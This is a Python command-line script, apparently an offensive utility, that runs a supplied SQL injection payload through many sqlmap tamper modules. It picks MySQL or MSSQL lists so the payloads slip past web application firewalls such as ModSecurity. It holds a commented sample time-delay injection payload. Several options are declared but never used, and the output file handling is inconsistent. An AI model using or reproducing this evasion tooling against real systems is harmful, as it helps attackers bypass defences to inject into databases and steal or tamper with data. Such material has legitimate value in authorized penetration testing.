#!/bin/python
# import tamper.securesphere as securesphere
import multipleespacio as multipleespacio
import tamper.apostrophemask as apostrophemask
import tamper.apostrophenullencode as apostrophenullencode
import tamper.base64encode as base64encode
import tamper.appendnullbyte as appendnullbyte
import tamper.between as between
import tamper.bluecoat as bluecoat
import tamper.chardoubleencode as chardoubleencode
import tamper.charencode as charencode
import tamper.charunicodeencode as charunicodeencode
import tamper.charunicodeescape as charunicodeescape
import tamper.commalesslimit as commalesslimit
import tamper.commalessmid as commalessmid
import tamper.commentbeforeparentheses as commentbeforeparentheses
import tamper.concat2concatws as concat2concatws
import tamper.equaltolike as equaltolike
import tamper.escapequotes as escapequotes
import tamper.greatest as greatest
import tamper.halfversionedmorekeywords as halfversionedmorekeywords
import tamper.hex2char as hex2char
import tamper.htmlencode as htmlencode
import tamper.ifnull2casewhenisnull as ifnull2casewhenisnull
import tamper.ifnull2ifisnull as ifnull2ifisnull
import tamper.informationschemacomment as informationschemacomment
import tamper.least as least
import tamper.lowercase as lowercase
import tamper.luanginx as luanginx
import tamper.modsecurityversioned as modsecurityversioned
import tamper.modsecurityzeroversioned as modsecurityzeroversioned
import tamper.multiplespaces as multiplespaces
import tamper.overlongutf8 as overlongutf8
import tamper.overlongutf8more as overlongutf8more
import tamper.percentage as percentage
import tamper.plus2concat as plus2concat
import tamper.plus2fnconcat as plus2fnconcat
import tamper.randomcase as randomcase
import tamper.randomcomments as randomcomments
import tamper.space2comment as space2comment
import tamper.space2dash as space2dash
import tamper.space2hash as space2hash
import tamper.space2morecomment as space2morecomment
import tamper.space2morehash as space2morehash
import tamper.space2mssqlblank as space2mssqlblank
import tamper.space2mssqlhash as space2mssqlhash
import tamper.space2mysqlblank as space2mysqlblank
import tamper.space2mysqldash as space2mysqldash
import tamper.space2plus as space2plus
import tamper.space2randomblank as space2randomblank
import tamper.sp_password as sp_password
import tamper.substring2leftright as substring2leftright
import tamper.symboliclogical as symboliclogical
import tamper.unionalltounion as unionalltounion
import tamper.unmagicquotes as unmagicquotes
import tamper.uppercase as uppercase
import tamper.varnish as varnish
import tamper.versionedkeywords as versionedkeywords
import tamper.versionedmorekeywords as versionedmorekeywords
import tamper.xforwardedfor as xforwardedfor

import argparse
import os
import time
# import file

listMSSQL = {between,charencode,charunicodeencode,equaltolike,greatest,multipleespacio,percentage,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes}
listMYSQL = {between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor}
listGeneric = {apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes}

named_tuple = time.localtime() # get struct_time
time_string = time.strftime("%m%d%Y-%H:%M", named_tuple)

parser = argparse.ArgumentParser()

parser.add_argument('--payload', action="store", type=str, dest="paypay", help='Enter the payload in that param')
parser.add_argument('--file', action="store", dest="payfile", help='Enter a file with a list of paylaods')
parser.add_argument('--mysql-encode', action="store_true", dest="mysqlenc", help='Run deafult mysql tampers')
parser.add_argument('--mssql-encode', action="store_true", dest="mssqlenc", help='Run defaul mssql tampers')
parser.add_argument('--random-encode', action="store_true", dest="rndEnc", help='Run random tampers from file')
parser.add_argument('--random-concat', action="store", dest="rndCnt", help='Run random concatenated tampers from file')
parser.add_argument('--massive', action="store", dest="mssv", help='Run all tampers')

os.system("touch ./out/"+time_string+"-encoded.out")
f= open("./out/encoded.out","w+")

# print parser.parse_args()

print("\n[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]\n")

print('''
                       _       __ __      ___  _          _
 ___ ._ _  ___  ___  _| | ___ |  \  \ ___|_ _|| |_  ___ _| |_
/ ._>| ' |/ | '/ . \/ . |/ ._>|     |/ ._>| | | . |<_> | | |
\___.|_|_|\_|_.\___/\___|\___.|_|_|_|\___.|_| |_|_|<___| |_|
''')
print(" Payload encoder using sqlmap tampers.\n")
print("\n[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]\n")

argVt = parser.parse_args()

# sqlinjPayload = "'; IF (1=1) WAITFOR DELAY '0:0:20'--"
# sqlinjPayload = input("[+] Enter payload:")
sqlinjPayload = argVt.paypay
print("Let¡s encode: "+argVt.paypay)

# payList[] = listGeneric
if argVt.mysqlenc:
    print("[+] You are using mysql default encoding options")
    payList = listMYSQL
    pass
if argVt.mssqlenc:
    print("[+] You are using mssql default encoding options")
    payList = listMSSQL
    pass

print("Result:\n")
# listMSSQL
for payloadEncoder in payList:
    # print((sqlinjPayload))
    try:
        print(payloadEncoder.tamper(sqlinjPayload))
        f.write(payloadEncoder.tamper(sqlinjPayload)+"\n")
        pass
    except KeyError as e:
        pass
        raise


print(time_string+"-encoded.out")

# for i in range(len(payList)):
#     print(payList[i].tamper(sqlinjPayload)+"\n")
